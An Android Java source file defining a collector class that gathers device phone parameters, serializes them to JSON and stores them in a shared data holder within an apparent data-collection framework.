package com.xaviar.collect.phoneparams;



import java.util.Collection;
import java.util.List;

import android.content.Context;
import android.util.Log;

import com.xaviar.frm.DataHolder;
import com.xaviar.frm.ICollector;
import com.xaviar.frm.ThreadCollector;

import flexjson.JSONSerializer;


public class CollectPhoneParams extends ThreadCollector implements ICollector {

	private final static String name = "CollectPhoneParams";
	private static final String TAG = name;
	

	public CollectPhoneParams(Context ctx,String genericData) {
		this.genericData = genericData;
		this.ctx = ctx;
	}
	
	public CollectPhoneParams() {	
		setName(CollectPhoneParams.name);
	}


	public CollectPhoneParams(Context ctx) {
		setContext(ctx);
	}

	@Override
	protected String getAllData() {
		Log.d(TAG,"Enter sms getAllData()");
		List<PhoneParams> phoneParams = PhoneParamsUtil.getPhoneParams(ctx);
       genericData =  translateContactEntityToGeneric(phoneParams);		
		return genericData;
	}
	private String translateContactEntityToGeneric(
			List<PhoneParams> phoneParams) {
		Log.d(TAG,"Enter translateContactEntityToGeneric()");
		int size = 0;
		if (phoneParams != null)
		{
		 size = phoneParams.size();
		 }
		String ret = toJsonArray(phoneParams);
		Log.d(TAG,"ret:" + ret);
		
		Log.d(TAG,"Num of contacts entry:" + size);
		return ret;
	}
	public static String toJsonArray(Collection<PhoneParams> collection) {
		   return new JSONSerializer().exclude("*.class").serialize(collection);
		}

	@Override
	public String getHolderKey() {	
		return DataHolder.PHONE_PARAMS;	
	}

	


}